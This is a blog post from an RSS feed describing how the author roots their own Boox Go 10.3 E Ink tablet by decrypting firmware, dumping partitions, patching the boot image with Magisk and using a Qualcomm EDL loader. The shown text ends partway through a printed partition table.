<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Clifford Ressel Blog</title>
        <link>https://clifford.ressel.fyi/blog</link>
        <description>Clifford Ressel Blog</description>
        <lastBuildDate>Tue, 12 Aug 2025 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[E Ink tablets: Rooting a Boox Go 10.3]]></title>
            <link>https://clifford.ressel.fyi/blog/eink-tablet-part1</link>
            <guid>https://clifford.ressel.fyi/blog/eink-tablet-part1</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Motivation]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="motivation">Motivation<a href="https://clifford.ressel.fyi/blog/eink-tablet-part1#motivation" class="hash-link" aria-label="Direct link to Motivation" title="Direct link to Motivation">​</a></h2>
<p>I haven't worked on a lower-level systems project in a while, I haven't worked on reversing or binaries since a brief stint in college, I've never worked on anything in the Android software ecosystem, and I haven't yet written or modified Linux device drivers myself.</p>
<p>Directly in line with those goals is an unmet hardware need: my growing desire for an E Ink tablet that will run an open source Android build.
I've heard that some users have gotten LineageOS running on a Hisense, which is in the neighborhood of what I would be interested in.
However, my note taking preferences require the screen real estate of a tablet.
For several months, I've used a Boox Go 10.3 as an untrusted device solely for epub reading.
As time has gone on, this tablet's full Play Store access on an Android build hints at tantalizing possibilities: the congruous feeling of a paper-like calendar or planner, an E Ink optimized RSS reader, note taking and email on the go, all further enabled by my obsession with small form factor wireless keyboards.
With that dream in mind, this is the perfect fit to learn a bit about AOSP and device drivers.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="project-goals">Project Goals<a href="https://clifford.ressel.fyi/blog/eink-tablet-part1#project-goals" class="hash-link" aria-label="Direct link to Project Goals" title="Direct link to Project Goals">​</a></h2>
<p>With my lay understanding of the hardware/software boundary in the mobile ecosystem, long term I would be curious how far I can get towards deploying an Android custom ROM to the Boox Go 10.3.
This unfortunately entails the very tough challenge of a full device bringup.
Boox has made this even tougher by not open sourcing either their kernel or the device tree.
For this to be minimally usable, it would require support for:</p>
<ul>
<li>Display driver (Carta 1200 10.3 inch)</li>
<li>Capacitive touch controller</li>
<li>Wireless chipset driver (wifi + bt)</li>
</ul>
<p>And nice-to-have's include:</p>
<ul>
<li>Wacom EMR driver</li>
<li>any quality of life improvements on the screen refresh or tearing</li>
<li>E Ink friendly UI elements (lock screen, menus, launcher)</li>
<li>emulate some of the Onyx per-app optimizations (refresh modes, dark color enhancement, light color filter, etc).</li>
</ul>
<p>I know I'll have to further define or correct that mile high overview as I go. It might even be possible that I need to re-target my work on a different hardware platform! (Whether that's a different Boox model, a reMarkable for the <a href="https://developer.remarkable.com/documentation/software-stack" target="_blank" rel="noopener noreferrer">better DX</a>, or the HiSense.)
Further resources:</p>
<ul>
<li>LineageOS's engineering series:<!-- -->
<ul>
<li><a href="https://lineageos.org/engineering/Qualcomm-Firmware/" target="_blank" rel="noopener noreferrer">https://lineageos.org/engineering/Qualcomm-Firmware/</a></li>
<li><a href="https://lineageos.org/engineering/HowTo-SELinux/" target="_blank" rel="noopener noreferrer">https://lineageos.org/engineering/HowTo-SELinux/</a></li>
<li><a href="https://lineageos.org/engineering/HowTo-Debugging/" target="_blank" rel="noopener noreferrer">https://lineageos.org/engineering/HowTo-Debugging/</a></li>
</ul>
</li>
<li>Some existing tools:<!-- -->
<ul>
<li><a href="https://github.com/bkerler/edl" target="_blank" rel="noopener noreferrer">https://github.com/bkerler/edl</a></li>
<li><a href="https://github.com/ssut/payload-dumper-go" target="_blank" rel="noopener noreferrer">https://github.com/ssut/payload-dumper-go</a></li>
<li><a href="https://github.com/Hagb/decryptBooxUpdateUpx" target="_blank" rel="noopener noreferrer">https://github.com/Hagb/decryptBooxUpdateUpx</a></li>
<li><a href="https://github.com/onyx-intl" target="_blank" rel="noopener noreferrer">https://github.com/onyx-intl</a> (limited and out of date, it looks like)</li>
<li><a href="https://wiki.postmarketos.org/wiki/ONYX_BOOX_Go_6_(onyx-go6)" target="_blank" rel="noopener noreferrer">https://wiki.postmarketos.org/wiki/ONYX_BOOX_Go_6_(onyx-go6)</a></li>
</ul>
</li>
<li>and I know later on in this side project, I'll have to get real comfortable on <a href="https://xdaforums.com/" target="_blank" rel="noopener noreferrer">XDA forums</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rooting-the-device">Rooting the Device<a href="https://clifford.ressel.fyi/blog/eink-tablet-part1#rooting-the-device" class="hash-link" aria-label="Direct link to Rooting the Device" title="Direct link to Rooting the Device">​</a></h2>
<p>My first task is to root the device (generally following <a href="https://blog.tho.ms/hacks/2021/03/27/hacking-onyx-boox-note-air.html" target="_blank" rel="noopener noreferrer">existing</a> <a href="https://cake.moe/blog/rooting-boox-tab-ultra/" target="_blank" rel="noopener noreferrer">works</a>, by Thomas Hollstegge and Mia respectively, working on different Boox devices).
This will provide far greater access on the device, as well as images of the current system partitions.</p>
<p>Onyx firmware is no longer listed online, so I needed to get the new update off my device itself.
My current build was <code>2024-10-24_10-59_3.5.4_2b800b967</code>, so I was able to re-open the Onyx Launcher I hadn't used in some time, and download the pending firmware update.
I transferred the build of <code>2025-06-18_14-27_4.0.2-rel_0614_35a32af51</code> to my workstation, and I was able to decrypt the firmware using the <a href="https://github.com/Hagb/decryptBooxUpdateUpx" target="_blank" rel="noopener noreferrer">Hagb/decryptBooxUpdateUpx</a> repo:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 DeBooxUpx.py Go103 update.upx</span><br></span></code></pre></div></div>
<p>The resulting directory is:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">update.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">📂 META-INF</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  📂  com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    📂  android</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      📄 metadata</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      📄 metadata.pb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      📄 otacert</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">📄 apex_info.pb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">📄 care_map.pb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">📄 payload.bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">📄 payload_properties.txt</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>🤖 Gemini 2.5 Pro says:</p><p>Root Directory Files</p><p>These files are central to defining and applying the update.</p><ul>
<li>apex_info.pb: This protocol buffer file contains information about any APEX (Android Pony EXpress) files within the update. APEX is a container format used to deliver updatable, lower-level system modules. This file specifies the list of APEX files included in the payload.</li>
<li>care_map.pb: This file is primarily associated with A/B (seamless) system updates. It contains information that helps the update engine determine how to apply the update to the inactive partition slot while the user's system continues to run on the active slot. It can also detail which partitions can be wiped or if a data wipe is required.</li>
<li>payload.bin: This is the core of the update package. It's a binary file that contains the compressed images of the various system partitions to be updated, such as system, vendor, and boot. For A/B updates, this payload is streamed to the inactive partition and applied.</li>
<li>payload_properties.txt: This text file contains properties and metadata about the payload.bin file. It includes information such as the payload's size, hash, and header details. This allows the system to verify the integrity of the payload before and during the update process.</li>
</ul></div></div>
<p>The payload can be split out into separate partition images using a tool like <a href="https://github.com/ssut/payload-dumper-go?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">ssut/payload-dumper-go</a>, or using the open source EDL implementation to dump the existing partitions. Since we already have the payload, we can for now skip the headache with EDL (where we have to find an applicable loader file for this SoC). We run:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">./payload-dumper-go payload.bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 3.8G</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 156K Jul  9 10:06 abl.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford  96M Jul  9 10:06 boot.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 8.0M Jul  9 10:06 dtbo.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford  35M Jul  9 10:06 modem.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 592M Jul  9 10:06 product.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford  96M Jul  9 10:06 recovery.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 2.2G Jul  9 10:07 system.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 361M Jul  9 10:06 system_ext.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 8.0K Jul  9 10:06 vbmeta.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 4.0K Jul  9 10:06 vbmeta_system.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 480M Jul  9 10:06 vendor.img</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x 1 clifford clifford 3.1M Jul  9 10:06 xbl.img</span><br></span></code></pre></div></div>
<p>So let's patch the boot image to prep for install of Magisk, apply the update in Onyx, and finally flash the new boot image.
Magisk easily patches the image to produce <code>magisk_patched-29000_F55YV.img</code>, but that's where the struggles begin.
Within fastboot, both <code>boot</code> and <code>flash</code> send the image to the device, but then finally return command not found.</p>
<p>Big set back here, I was hoping not to faff around with EDL and loaders and similar to start.
However, with those commands disabled there isn't another way to flash the boot image.
Time to setup EDL properly!
The EDL repo does some global system installation that I wasn't eager about; the udev rules make sense, but the system python dep installation isn't my favorite.
I got the EDL repo working after some trial and error:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo bash install-linux-edl-drivers.sh  # Required changes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uv venv -p 3.13                         # Setup an isolated environment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uv pip install -e .                     # Install the project deps in devmode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">source .venv/bin/activate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./edl  --help                           # Test that the command works</span><br></span></code></pre></div></div>
<p>I had some issues with getting <code>edl printgpt</code> to work, as there's no loader for SM6225 in the provided submodule, and while testing out various loaders suggested online my device became unresponsive to all EDL commands.
After holding down the power button for long periods until the device rebooted out of recovery mode, I was able to reboot to EDL again and <a href="https://github.com/bkerler/Loaders/issues/97" target="_blank" rel="noopener noreferrer">one of the loaders I had tried earlier</a> (formerly with no luck) was now working!</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">edl --loader sm6225.bin printgpt</span><br></span></code></pre></div></div>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary><p>Example Partition Output</p></summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Qualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2025.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main - Using loader sm6225.bin ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main - Waiting for the device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main - Device detected :)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - Protocol version: 2, Version supported: 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main - Mode detected: sahara</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version 0x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HWID:              0x################ (MSM_ID:0x########,OEM_ID:0x0000,MODEL_ID:0x0000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">CPU detected:      "divar"</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PK_HASH:           0x################################################################################################</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Serial:            0x########</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - Protocol version: 2, Version supported: 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - Uploading loader sm6225.bin ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - 64-Bit mode detected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - Firehose mode detected, uploading...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sahara - Loader successfully uploaded.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">main - Trying to connect to firehose loader ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: Binary build date: Jan 10 2024 @ 18:16:46</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: Binary build date: Jan 10 2024 @ 18:16:46</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: Chip serial num: ######### (0x########)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: Supported Functions (15):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: program</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: read</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: nop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: patch</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: configure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: setbootablestoragedrive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: erase</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: power</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: firmwarewrite</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: getstorageinfo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: benchmark</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: emmc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: ufs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: fixgpt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: getsha256digest</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - INFO: End of supported functions 15</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose_client</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose_client - [LIB]: No --memory option set, we assume "UFS" as default ..., if it fails, try using "--memory" with "UFS","NAND" or "spinor" instead !</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - [LIB]: Couldn't detect MaxPayloadSizeFromTargetinBytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - [LIB]: Couldn't detect TargetName</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - TargetName=Unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - MemoryName=UFS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - Version=1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - Trying to read first storage sector...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - Running configure...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - Storage report:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - total_blocks:14507008</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - block_size:4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - page_size:4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - num_physical:6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - manufacturer_id:2597</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - serial_num:##########</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - fw_version:1.7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - mem_type:UFS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose - prod_name:eUFS2.2_064</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">firehose_client - Supported functions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-----------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">program,read,nop,patch,configure,setbootablestoragedrive,erase,power,firmwarewrite,getstorageinfo,benchmark,emmc,ufs,fixgpt,getsha256digest</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 0:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssd:                 Offset 0x0000000000006000, Length 0x0000000000002000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">persist:             Offset 0x0000000000008000, Length 0x0000000002000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">misc:                Offset 0x0000000002008000, Length 0x0000000000100000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">keystore:            Offset 0x0000000002108000, Length 0x0000000000080000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">frp:                 Offset 0x0000000002188000, Length 0x0000000000080000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">super:               Offset 0x0000000002208000, Length 0x0000000100000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">recovery_a:          Offset 0x0000000102208000, Length 0x0000000006000000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">recovery_b:          Offset 0x0000000108208000, Length 0x0000000006000000, Flags 0x1004000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vbmeta_system_a:     Offset 0x000000010e208000, Length 0x0000000000010000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vbmeta_system_b:     Offset 0x000000010e218000, Length 0x0000000000010000, Flags 0x1004000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">metadata:            Offset 0x000000010e228000, Length 0x0000000001000000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">onyxconfig:          Offset 0x000000010f228000, Length 0x0000000001800000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">userdata:            Offset 0x0000000110a28000, Length 0x0000000cc51d3000, Flags 0x0000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000dd5c00000, sectors:0x0000000000dd5c00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 1:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">xbl_a:               Offset 0x0000000000006000, Length 0x0000000000380000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">xbl_config_a:        Offset 0x0000000000386000, Length 0x0000000000020000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000000800000, sectors:0x0000000000000800</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 2:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">xbl_b:               Offset 0x0000000000006000, Length 0x0000000000380000, Flags 0x10c4000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">xbl_config_b:        Offset 0x0000000000386000, Length 0x0000000000020000, Flags 0x00c4000000000000, UUID ####################################, Type ##########, Active True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000000800000, sectors:0x0000000000000800</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 3:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ALIGN_TO_128K_1:     Offset 0x0000000000006000, Length 0x000000000001a000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cdt:                 Offset 0x0000000000020000, Length 0x0000000000020000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ddr:                 Offset 0x0000000000040000, Length 0x0000000000100000, Flags 0x1000000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Total disk size:0x0000000008000000, sectors:0x0000000000008000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing Lun 4:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPT Table:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpm_a:               Offset 0x0000000000006000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tz_a:                Offset 0x0000000000086000, Length 0x0000000000400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hyp_a:               Offset 0x0000000000486000, Length 0x0000000000080000, Flags 0x0040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">modem_a:             Offset 0x0000000000506000, Length 0x000000000b400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluetooth_a:         Offset 0x000000000b906000, Length 0x0000000000100000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mdtpsecapp_a:        Offset 0x000000000ba06000, Length 0x0000000000400000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mdtp_a:              Offset 0x000000000be06000, Length 0x0000000002000000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">abl_a:               Offset 0x000000000de06000, Length 0x0000000000100000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dsp_a:               Offset 0x000000000df06000, Length 0x0000000002000000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">keymaster_a:         Offset 0x000000000ff06000, Length 0x0000000000080000, Flags 0x1040000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">boot_a:              Offset 0x000000000ff86000, Length 0x0000000006000000, Flags 0x0073000000000000, UUID ####################################, Type ##########, Active False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 